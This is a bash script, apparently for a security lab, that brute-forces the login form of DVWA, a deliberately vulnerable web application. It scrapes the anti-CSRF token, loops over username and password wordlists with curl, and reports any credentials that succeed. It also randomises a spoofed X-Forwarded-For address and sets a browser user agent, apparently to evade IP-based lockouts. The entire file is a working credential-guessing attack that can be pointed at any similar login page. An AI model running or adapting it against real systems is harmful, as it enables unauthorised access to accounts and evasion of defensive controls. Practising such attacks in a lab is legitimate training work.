#!/bin/bash
# Quick PoC template for HTTP POST form brute force, with anti-CRSF token
# Target: DVWA v1.10
#   Date: 2015-10-19
# Author: g0tmi1k ~ https://blog.g0tmi1k.com/
# Source: https://blog.g0tmi1k.com/2015/10/dvwa-login/
# modified by Teguh for dvwa sg innov lab
# additional useragent and x-forwarded-for random

## Variables
URL="https://dvwa.sgebc.local"
USER_LIST="userlist.txt"
PASS_LIST="passlist.txt"

## Value to look for in response (Whitelisting)
SUCCESS="Location: index.php"
useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
a=$RANDOM
b=$(($a%200+11))
src="$b.10.100.$b"

## Anti CSRF token
CSRF="$( curl -s --insecure --header "X-FORWARDED-FOR: $src" --user-agent "$useragent" -c dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"
[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1

## Counter
i=0

## Password loop
while read -r _PASS; do

  ## Username loop
  while read -r _USER; do

    ## Increase counter
    ((i=i+1))

    ## Feedback for user
    echo "[i] Try ${i}: ${_USER} // ${_PASS} Source:$src"

    ## Connect to server
    #CSRF=$( curl -s -c dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | awk -F "'" '{print $2}' )
    REQUEST="$( curl -s -k --header "X-FORWARDED-FOR: $src" --user-agent "$useragent" -i -b dvwa.cookie --data "username=${_USER}&password=${_PASS}&user_token=${CSRF}&Login=Login" "${URL}/login.php" )"
    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'

    ## Check response
    echo "${REQUEST}" | grep -q "${SUCCESS}"
    if [[ "$?" -eq 0 ]]; then
      ## Success!
      echo -e "\n\n[i] Found!"
      echo "[i] Username: ${_USER}"
      echo "[i] Password: ${_PASS}"
      break 2
    fi

  done < ${USER_LIST}
done < ${PASS_LIST}

## Clean up
rm -f dvwa.cookie
